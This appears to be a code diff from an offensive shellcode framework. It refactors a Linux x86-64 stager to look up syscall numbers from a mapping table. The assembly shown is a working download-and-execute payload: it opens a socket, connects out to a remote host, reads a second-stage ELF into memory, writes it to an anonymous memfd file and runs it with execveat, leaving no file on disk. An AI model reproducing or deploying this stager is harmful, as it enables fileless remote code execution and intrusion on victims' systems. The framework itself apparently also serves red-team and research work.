@@ -5,6 +5,7 @@ import struct
 import sickle.common.lib.generic.extract as extract
 import sickle.common.lib.generic.convert as convert
 import sickle.common.lib.generic.modparser as modparser
+import sickle.common.lib.reversing.mappings as mappings
 import sickle.common.lib.programmer.builder as builder
 
 from sickle.common.lib.reversing.assembler import Assembler
@@ -80,6 +81,15 @@ class Shellcode():
             "pathname"   : 0x00,
         }
 
+        self.syscalls = mappings.get_linux_syscalls(["mmap",
+                                                     "socket",
+                                                     "connect",
+                                                     "write",
+                                                     "read",
+                                                     "mremap",
+                                                     "memfd_create",
+                                                     "execveat"])
+
         self.stack_space = builder.calc_stack_space(sc_args)
         self.storage_offsets = builder.gen_offsets(sc_args)
 
@@ -144,7 +154,7 @@ create_allocation:
     dec r8
     xor r9, r9
     xor rax, rax
-    mov al, 0x09
+    mov al, {self.syscalls['mmap']}
     syscall
     test rax, rax
     je exit
@@ -157,7 +167,7 @@ create_sockfd:
     mov rdi, 0x02
     mov rsi, 0x01
     mov rdx, 0x06
-    mov rax, 0x29
+    mov rax, {self.syscalls['socket']}
     syscall
     mov [rbp - {self.storage_offsets['sockfd']}], rax
 
@@ -172,7 +182,7 @@ connect:
     xor rax, rax
     mov [rsi+8], rax
     mov rdx, 0x10
-    mov rax, 0x2a
+    mov rax, {self.syscalls['connect']}
     syscall
         """
 
@@ -210,7 +220,7 @@ connect:
     mov rdi, [rbp - {self.storage_offsets['sockfd']}]
     lea rsi, [rbp - {self.storage_offsets['buffer']}]
     mov rdx, {len(self.ack_packet)}
-    mov rax, 0x1
+    mov rax, {self.syscalls['write']}
     syscall
         """
 
@@ -227,7 +237,7 @@ download_stager:
     mov rdi, [rbp - {self.storage_offsets['sockfd']}]
     lea rsi, [rbp - {self.storage_offsets['readBuffer']}]
     mov rdx, {self.sock_buffer_size}
-    mov rax, 0x00
+    mov rax, {self.syscalls['read']}
     syscall
 
     test rax, rax
@@ -265,7 +275,7 @@ realloc:
     mov rdx, r13
     mov r10, 0x01
     lea r8, [rbp - {self.storage_offsets['out']}]
-    mov rax, 0x19
+    mov rax, {self.syscalls['mremap']}
     syscall
 
     mov [rbp - {self.storage_offsets['mapping']}], rax
@@ -285,7 +295,7 @@ create_memory_file:
     mov dword ptr [rdi], 0x41414141
 
     mov rsi, 0x01
-    mov rax, 0x13f
+    mov rax, {self.syscalls['memfd_create']}
     syscall
     mov [rbp - {self.storage_offsets['anonfd']}], rax
 
@@ -296,7 +306,7 @@ write_to_file:
     mov rdi, [rbp - {self.storage_offsets['anonfd']}]
     mov rsi, [rbp - {self.storage_offsets['mapping']}]
     mov rdx, [rbp - {self.storage_offsets['elf_size']}]
-    mov rax, 0x1
+    mov rax, {self.syscalls['write']}
     syscall
 
 execute_elf:
@@ -313,7 +323,7 @@ execute_elf:
     lea r10, [rbp - {self.storage_offsets['readBuffer']}]
     mov rdx, r10
     mov [r10], rax
-    mov rax, 0x142
+    mov rax, {self.syscalls['execveat']}
     syscall
 exit:
     xor rax, rax
